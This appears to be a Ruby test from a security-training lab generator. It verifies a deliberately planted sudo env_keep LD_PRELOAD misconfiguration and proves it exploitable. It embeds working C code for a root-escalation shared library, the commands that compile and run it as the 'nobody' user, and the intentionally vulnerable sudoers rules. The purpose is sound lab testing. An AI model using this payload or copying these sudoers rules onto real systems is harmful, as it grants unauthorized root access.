require_relative '../../../../../lib/post_provision_test'


class SudoEnvKeepLdPreloadTest < PostProvisionTest
  def initialize
    self.module_name = 'sudo_env_keep_ld_preload'
    self.module_path = get_module_path(__FILE__)
    super
  end

  # Inputs: leaked_filenames and strings_to_leak are both checked below.
  def test_module
    super
    leaked = Array(self.json_inputs['leaked_filenames']).map(&:to_s).reject(&:empty?)
    strings = Array(self.json_inputs['strings_to_leak']).map(&:to_s)

    tier(1) do
      test_local_command('env_keep default keeps LD_PRELOAD',
                         'cat /etc/sudoers.d/10_ld_preload_env_keep', 'Defaults env_keep += "LD_PRELOAD"')
      test_local_command('sudoers rule allows the status script as root with no password',
                         'cat /etc/sudoers.d/10_ld_preload_status_script',
                         'ALL  ALL=(root) NOPASSWD: /usr/local/bin/system_status')
      test_local_command('sudoers rule allows sudo -l with no password',
                         'cat /etc/sudoers.d/10_ld_preload_sudo_list', 'ALL  ALL=(root) NOPASSWD: /usr/bin/sudo -l')
      test_local_command('sudoers configuration passes visudo -c', 'visudo -c 2>&1', 'parsed OK')
      test_local_command('status script root-owned and executable',
                         "stat -c '%U:%G %a' /usr/local/bin/system_status", 'root:root 755')

      leaked.each do |f|
        test_local_command("#{f} root-only in /root", "stat -c '%U:%G %a' #{Shellwords.escape("/root/#{f}")}", 'root:root 600')
      end
    end

    tier(2) do
      # what a student sees (sudo prints the list value unquoted): sudo -l lists LD_PRELOAD as a kept variable and the allowed command
      test_local_command('unprivileged user sees LD_PRELOAD kept by sudo', 'sudo -n -l', 'env_keep+=LD_PRELOAD', user: 'nobody')
      test_local_command('unprivileged user sees the allowed root command', 'sudo -n -l', '/usr/local/bin/system_status', user: 'nobody')
      test_command_succeeds('unprivileged user runs the status script as root',
                            'sudo -n /usr/local/bin/system_status', user: 'nobody')
      # the flag is not readable without escalating
      strings.each_with_index do |s, i|
        next if s.strip.empty?
        fname = leaked[i] || leaked.first
        next unless fname
        test_command_succeeds("unprivileged user cannot read leaked #{fname} directly",
                              "! cat #{Shellwords.escape("/root/#{fname}")} 2>/dev/null", user: 'nobody')
      end
    end

    # Tier 3: GTFOBins "sudo" LD_PRELOAD technique (https://gtfobins.github.io/gtfobins/sudo/).
    # sudo keeps LD_PRELOAD (env_keep), so the allowed root command loads an attacker
    # library whose constructor runs as root. Proven locally as an existing
    # unprivileged account (nobody), exactly as the sibling sudo_root_awk module
    # proves its misconfiguration, by reading the root-only flag (<privilege>=root_rwx).
    tier(3) do
      idx    = strings.index { |s| !s.strip.empty? }
      fname  = idx && leaked[idx]
      secret = idx && strings[idx]
      if fname.nil? || secret.nil? || secret.strip.empty?
        skip_check('tier 3 LD_PRELOAD privesc', 'no leaked flag/string configured to prove a root read', tier: 3)
      else
        flag_path = "/root/#{fname}"
        lib_path  = '/tmp/secgen_t3_preload.so'
        # The constructor runs as root inside the sudo-allowed command. It reads the
        # root-only flag straight to stdout with direct POSIX calls and then _exit(0):
        # no system()/shell, so nothing can re-enter the preload or block on a child
        # (the earlier system()-based payload stalled the guest agent), and the host
        # command never continues past the constructor.
        csrc = <<~C
          #include <stdio.h>
          #include <unistd.h>
          #include <stdlib.h>
          #include <fcntl.h>
          __attribute__((constructor)) void secgen_t3(void){
            unsetenv("LD_PRELOAD"); setgid(0); setuid(0);
            dprintf(1, "secgen_ld_preload uid=%d euid=%d\\n", getuid(), geteuid());
            int in = open(#{c_string(flag_path)}, O_RDONLY);
            if (in >= 0){ char b[4096]; ssize_t n; while((n = read(in, b, sizeof b)) > 0) write(1, b, n); close(in); }
            _exit(0);
          }
        C
        if !compile_preload(csrc, lib_path)
          skip_check('tier 3 LD_PRELOAD privesc',
                     'no C compiler on the target to build the LD_PRELOAD library', tier: 3)
        else
          # Run the allowed root command with LD_PRELOAD set, as the existing
          # unprivileged nobody account (sudoers allows ALL users). `timeout`
          # guards against any stall so the guest-agent call always returns.
          exploit = "timeout 30 sudo -n LD_PRELOAD=#{lib_path} /usr/local/bin/system_status"
          out  = run_as_user('nobody', exploit, timeout: 60)
          body = "#{out[:stdout]}\n#{out[:stderr]}"
          add_evidence('ld_preload_exploit', "echo #{Shellwords.escape(body[0, 2000])}")
          wanted = secret.strip.lines.first.to_s.strip
          if body !~ /secgen_ld_preload uid=0\b/
            fail_check('tier 3 LD_PRELOAD privesc',
                       "exploit did not run as root (<privilege>=root_rwx); output: #{body.strip[0, 200]}", tier: 3)
          elsif !wanted.empty? && !body.include?(wanted)
            fail_check('tier 3 LD_PRELOAD privesc',
                       "ran as root but did not read #{flag_path}", tier: 3)
          else
            pass_check('tier 3 LD_PRELOAD privesc',
                       "unprivileged nobody loaded an attacker library via sudo env_keep LD_PRELOAD, ran as root (uid=0) and read #{flag_path}", tier: 3)
          end
          run_vagrant_ssh("rm -f #{lib_path}")
        end
      end
    end
  end

  private

  # A C string literal for `s`, backslash-escaping backslashes and double quotes.
  def c_string(s)
    "\"#{s.gsub(/[\\"]/) { |ch| "\\#{ch}" }}\""
  end

  # Build the LD_PRELOAD shared library at lib_path (world-readable) on the target.
  # Prefer the target's own compiler; if the base has none, compile on the Kali
  # attacker and copy the .so across (the symbols used are old enough to load on
  # Debian 12). Returns true on success.
  def compile_preload(csrc, lib_path)
    src_b64 = Base64.strict_encode64(csrc)
    have_cc = run_vagrant_ssh('command -v cc gcc 2>/dev/null | head -1')[:stdout].to_s.strip
    unless have_cc.empty?
      build = "echo #{src_b64} | base64 -d > /tmp/secgen_t3.c && " \
              "#{have_cc} -fPIC -shared -o #{lib_path} /tmp/secgen_t3.c && chmod 644 #{lib_path}; rm -f /tmp/secgen_t3.c"
      r = run_vagrant_ssh(build, timeout: 120)
      return true if r[:exit_status] == 0
      add_evidence('target_compile', "echo #{Shellwords.escape(r[:stderr].to_s)}")
    end
    atk = attack_system
    return false unless atk
    acc = run_on_system(atk, 'command -v cc gcc 2>/dev/null | head -1')[:stdout].to_s.strip
    return false if acc.empty?
    abuild = "echo #{src_b64} | base64 -d > /tmp/secgen_t3.c && " \
             "#{acc} -fPIC -shared -o /tmp/secgen_t3.so /tmp/secgen_t3.c && base64 -w0 /tmp/secgen_t3.so; " \
             "rm -f /tmp/secgen_t3.c /tmp/secgen_t3.so"
    so_b64 = run_on_system(atk, abuild, timeout: 180)[:stdout].to_s.strip
    return false if so_b64.empty?
    r = run_vagrant_ssh("echo #{so_b64} | base64 -d > #{lib_path} && chmod 644 #{lib_path}", timeout: 60)
    r[:exit_status] == 0
  end

end

SudoEnvKeepLdPreloadTest.new.run
